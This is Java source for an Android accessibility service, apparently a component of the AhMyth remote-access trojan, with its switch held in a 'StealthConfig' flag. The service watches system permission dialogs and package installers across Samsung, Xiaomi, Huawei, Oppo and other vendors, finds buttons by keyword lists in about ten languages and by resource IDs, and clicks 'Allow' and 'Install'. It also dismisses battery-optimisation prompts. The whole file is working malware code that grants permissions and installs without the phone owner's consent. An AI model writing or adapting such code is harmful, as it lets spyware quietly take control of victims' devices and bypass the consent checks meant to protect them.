package ahmyth.mine.king.ahmyth;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.provider.Settings;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import java.util.HashSet;
import java.util.List;
import java.util.Set;

/**
 * Accessibility service that automatically grants permissions
 * by detecting permission dialogs and clicking "Allow" buttons
 * 
 * Also handles:
 * - Auto-starting after reboot
 * - Auto-clicking install/update prompts
 * - Auto-dismissing battery optimization warnings
 */
public class PermissionGranterService extends AccessibilityService {
    
    private static final String TAG = "PermGrant";
    private static PermissionGranterService instance = null;
    
    // Track last clicked node to avoid repeated clicks
    private String lastClickedId = "";
    private long lastClickTime = 0;
    private static final long CLICK_COOLDOWN_MS = 500;
    
    // Keywords to identify grant/allow buttons across different languages and Android versions
    private static final String[] ALLOW_KEYWORDS = {
        // English
        "allow", "grant", "permit", "accept", "yes", "ok", "okay", "continue",
        "while using", "only this time", "always allow", "allow anyway",
        "allow all", "allow this", "start", "enable", "turn on", "activate",
        "install", "update", "open", "got it", "done", "next", "agree",
        
        // Polish
        "zezwól", "pozwól", "tak", "akceptuj", "kontynuuj", "włącz",
        "podczas używania", "tylko tym razem", "zawsze zezwalaj",
        
        // German
        "erlauben", "zulassen", "ja", "akzeptieren", "weiter", "aktivieren",
        
        // French
        "autoriser", "permettre", "oui", "accepter", "continuer", "activer",
        
        // Spanish
        "permitir", "aceptar", "sí", "continuar", "activar", "habilitar",
        
        // Russian
        "разрешить", "да", "принять", "продолжить", "включить",
        
        // Chinese
        "允许", "同意", "确定", "继续", "是", "好",
        
        // Japanese
        "許可", "はい", "許可する", "同意する",
        
        // Korean
        "허용", "예", "확인", "계속",
        
        // Portuguese
        "permitir", "sim", "aceitar", "continuar"
    };
    
    // Resource IDs that commonly contain allow/grant buttons
    private static final String[] ALLOW_RESOURCE_IDS = {
        "permission_allow_button",
        "permission_allow_foreground_only_button",
        "permission_allow_always_button",
        "permission_allow_one_time_button",
        "continue_button",
        "allow_button",
        "positive_button",
        "button1",
        "ok_button",
        "accept_button",
        "grant_button"
    };
    
    // Package names of system permission dialogs and installers
    private static final String[] PERMISSION_PACKAGES = {
        "com.android.packageinstaller",
        "com.google.android.packageinstaller", 
        "com.android.permissioncontroller",
        "com.google.android.permissioncontroller",
        // Samsung
        "com.samsung.android.permissioncontroller",
        "com.samsung.android.packageinstaller",
        // Xiaomi/MIUI
        "com.miui.securitycenter",
        "com.miui.permcenter",
        // OPPO/ColorOS
        "com.coloros.safecenter",
        "com.oppo.safe",
        // Vivo
        "com.vivo.permissionmanager",
        // Huawei
        "com.huawei.systemmanager",
        // OnePlus
        "com.oneplus.security",
        // Generic
        "android"
    };
    
    // Packages to dismiss (e.g., battery optimization dialogs)
    private static final String[] DISMISS_PACKAGES = {
        "com.android.settings"
    };
    
    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        Log.d(TAG, "Service created");
    }
    
    @Override
    public void onDestroy() {
        super.onDestroy();
        instance = null;
        Log.d(TAG, "Service destroyed");
    }
    
    public static PermissionGranterService getInstance() {
        return instance;
    }
    
    public static boolean isServiceEnabled(Context context) {
        try {
            String serviceName = context.getPackageName() + "/" + PermissionGranterService.class.getName();
            String enabledServices = Settings.Secure.getString(
                context.getContentResolver(), 
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            );
            return enabledServices != null && enabledServices.contains(serviceName);
        } catch (Exception e) {
            return false;
        }
    }
    
    public static void openAccessibilitySettings(Context context) {
        try {
            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);
        } catch (Exception e) {
            Log.e(TAG, "Error opening accessibility settings", e);
        }
    }
    
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (!StealthConfig.USE_ACCESSIBILITY_GRANTER) {
            return;
        }
        
        if (event == null) return;
        
        String packageName = event.getPackageName() != null ? 
            event.getPackageName().toString() : "";
        
        // Log for debugging
        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            Log.d(TAG, "Window changed: " + packageName);
        }
        
        // Check if this is a permission dialog
        boolean isPermissionDialog = false;
        for (String pkg : PERMISSION_PACKAGES) {
            if (packageName.contains(pkg)) {
                isPermissionDialog = true;
                break;
            }
        }
        
        // Also handle settings app (for battery optimization, etc.)
        boolean isDismissable = false;
        for (String pkg : DISMISS_PACKAGES) {
            if (packageName.contains(pkg)) {
                isDismissable = true;
                break;
            }
        }
        
        if (!isPermissionDialog && !isDismissable) return;
        
        Log.d(TAG, "Permission/settings dialog detected: " + packageName);
        
        // Try to find and click the allow button
        AccessibilityNodeInfo rootNode = getRootInActiveWindow();
        if (rootNode != null) {
            if (isPermissionDialog) {
                findAndClickAllowButton(rootNode, 0);
            } else if (isDismissable) {
                findAndClickDismissButton(rootNode, 0);
            }
            rootNode.recycle();
        }
    }
    
    private void findAndClickAllowButton(AccessibilityNodeInfo node, int depth) {
        if (node == null || depth > 15) return;
        
        String text = node.getText() != null ? node.getText().toString().toLowerCase().trim() : "";
        String contentDesc = node.getContentDescription() != null ? 
            node.getContentDescription().toString().toLowerCase().trim() : "";
        String viewId = node.getViewIdResourceName() != null ? 
            node.getViewIdResourceName().toLowerCase() : "";
        String className = node.getClassName() != null ? 
            node.getClassName().toString() : "";
        
        // Check if this is an allow button by text
        boolean isAllowButton = false;
        for (String keyword : ALLOW_KEYWORDS) {
            if (text.contains(keyword) || contentDesc.contains(keyword)) {
                isAllowButton = true;
                break;
            }
        }
        
        // Check by resource ID
        if (!isAllowButton) {
            for (String resourceId : ALLOW_RESOURCE_IDS) {
                if (viewId.contains(resourceId)) {
                    isAllowButton = true;
                    break;
                }
            }
        }
        
        // Try to click if it's an allow button and clickable
        if (isAllowButton && (node.isClickable() || className.contains("Button"))) {
            String nodeId = viewId + text + contentDesc;
            long now = System.currentTimeMillis();
            
            // Avoid clicking the same button too quickly
            if (!nodeId.equals(lastClickedId) || (now - lastClickTime) > CLICK_COOLDOWN_MS) {
                Log.d(TAG, "Clicking allow button: " + text + " id:" + viewId);
                
                if (node.isClickable()) {
                    boolean clicked = node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    if (clicked) {
                        lastClickedId = nodeId;
                        lastClickTime = now;
                        return;
                    }
                }
                
                // Try clicking parent if node itself isn't clickable
                AccessibilityNodeInfo parent = node.getParent();
                if (parent != null && parent.isClickable()) {
                    boolean clicked = parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    if (clicked) {
                        lastClickedId = nodeId;
                        lastClickTime = now;
                    }
                    parent.recycle();
                    return;
                }
            }
        }
        
        // Recursively check children
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                findAndClickAllowButton(child, depth + 1);
                child.recycle();
            }
        }
    }
    
    private void findAndClickDismissButton(AccessibilityNodeInfo node, int depth) {
        if (node == null || depth > 15) return;
        
        String text = node.getText() != null ? node.getText().toString().toLowerCase().trim() : "";
        String viewId = node.getViewIdResourceName() != null ? 
            node.getViewIdResourceName().toLowerCase() : "";
        
        // Look for dismiss-type buttons for battery dialogs, etc.
        boolean isDismissButton = text.contains("allow") || 
                                   text.contains("ok") || 
                                   text.contains("yes") ||
                                   text.contains("done") ||
                                   text.contains("got it") ||
                                   viewId.contains("allow") ||
                                   viewId.contains("button1") ||
                                   viewId.contains("positive");
        
        if (isDismissButton && node.isClickable()) {
            Log.d(TAG, "Clicking dismiss button: " + text);
            node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
            return;
        }
        
        // Recursively check children
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                findAndClickDismissButton(child, depth + 1);
                child.recycle();
            }
        }
    }
    
    @Override
    public void onInterrupt() {
        Log.d(TAG, "Service interrupted");
    }
    
    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        Log.d(TAG, "Permission granter service connected");
        instance = this;
        
        // Configure the service
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED | 
                          AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED |
                          AccessibilityEvent.TYPE_VIEW_CLICKED;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.flags = AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS |
                     AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS |
                     AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS;
        info.notificationTimeout = 100;
        
        // Monitor all packages for permission dialogs
        // info.packageNames = null; // null means all packages
        
        setServiceInfo(info);
        
        // Notify that service is ready
        Log.d(TAG, "Accessibility service fully configured");
    }
}
